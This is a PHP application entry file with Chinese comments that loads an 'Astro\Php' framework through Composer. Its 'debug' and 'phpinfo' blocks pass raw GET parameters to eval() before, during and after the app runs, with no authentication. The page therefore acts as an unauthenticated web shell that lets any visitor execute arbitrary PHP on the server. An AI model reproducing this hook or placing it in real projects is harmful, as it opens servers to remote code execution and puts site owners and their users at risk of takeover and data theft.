<?php
/* 全局变量 */
$_DEBUG = [
	'code' => null,
	'end' => null,
	'phpinfo' => null,
];

$_CONTROLLER = [
	'destruct' => null,
];


/* 全局对象 */
$PHP = null;


/* 前置调试 */
if (isset($_GET['debug'])) {
	// 错误报告
    ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
	
	$_DEBUG['code'] = $_GET['debug'];
	// 开始调试问题
	if (is_array($_DEBUG['code'])) {
		if (isset($_DEBUG['code'][0]) && $_DEBUG['code'][0]) {
			eval($_DEBUG['code'][0]);
		}
		if (isset($_DEBUG['code'][1])) {
			$_DEBUG['end'] = $_DEBUG['code'][1];
		}
	}
}

// PHP 配置的信息
if (isset($_GET['phpinfo']) || (isset($_SERVER['PATH_INFO']) && '/phpinfo' == $_SERVER['PATH_INFO']) ) {
	$_DEBUG['phpinfo'] = $_GET['phpinfo'] ? : -1;
	if (is_string($_DEBUG['phpinfo'])) {
		eval("\$_DEBUG['phpinfo'] = {$_DEBUG['phpinfo']};");
	}
	phpinfo($_DEBUG['phpinfo']);
	
	if (isset($_DEBUG['code'][2])) {
		// 中间调试问题
		if ($_DEBUG['code'][2]) {
			eval($_DEBUG['code'][2]);
		} else {
			exit;
		}
	}
}


/**
 * develop 	错误报告、调试信息
 * test		时间、内存
 * product 	日志
 *
 */
# require_once __DIR__ . '/../app/bootstrap.php';
define('APP_PATH', __DIR__);
$loader = require APP_PATH . '/../vendor/autoload.php';
# $loader->addPsr4('Acme\\Test\\', __DIR__);
new Astro\Php();


/* 后置调试 */
// 结束调试问题
if (!empty($_DEBUG['code'])) {
	$_DEBUG['end'] = $_DEBUG['end'] ? : (is_array($_DEBUG['code']) ? '' : $_DEBUG['code']);
	if ($_DEBUG['end']) {
		eval($_DEBUG['end']);
	}
}
